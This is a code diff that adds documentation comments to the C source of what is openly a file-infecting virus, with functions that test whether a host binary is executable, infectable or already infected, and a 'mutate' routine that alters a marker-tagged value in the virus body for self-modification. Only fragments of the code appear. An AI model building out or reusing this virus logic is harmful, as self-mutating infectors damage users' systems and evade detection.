@@ -334,7 +334,11 @@ int isInfectable(char* arg){
 	}
 
 }
-
+/*Checks whether the executable bit is set for the arguements.
+*
+*@return int - 0 if there is no executable bit set, and -1 if the
+*	executable bit is set or if there is another error.
+*/
 int isExecutable(char* arg1, char* arg2){
 	struct stat perm;
 	int err = 0;
@@ -387,7 +391,11 @@ int isExecutable(char* arg1, char* arg2){
 		return 0;
 	}
 }
-
+/*Mutates the binary of the virus portion of the code by searching
+ *for the unsigned int that is equal to 0xD15EA5E, and then changing
+ *the proceding value to a random integer.
+ *@return - returns 0 on success, and -1 otherwise.
+*/
 int mutate(int fd, char* arg, int offset){
 	int vfd = open(arg, O_RDONLY);
 	assert(vfd >= 0);
@@ -439,7 +447,10 @@ int mutate(int fd, char* arg, int offset){
 	}
 	return 0;
 }
-
+/*Checks whether the paramter file is already infected
+*
+*@return - 0 if not infected, and -1 otherwise or if error occurs
+*/
 int isInfected(char* arg){
 	//open host and virus
 	int fp = open(arg, O_RDONLY);
